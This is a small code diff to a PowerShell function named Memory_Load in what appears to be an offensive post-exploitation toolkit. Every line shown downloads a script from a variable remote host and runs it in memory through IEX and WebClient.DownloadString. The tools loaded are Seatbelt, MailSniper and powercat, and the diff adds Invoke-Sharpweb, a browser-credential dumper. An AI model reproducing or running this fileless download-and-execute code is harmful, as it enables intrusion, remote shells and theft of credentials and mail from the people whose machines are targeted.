@@ -46,6 +46,7 @@ function Memory_Load {
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Seatbelt.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/MailSniper.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/powercat.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Sharpweb.ps1")
     $global:mem_1029384756=1
 }
 
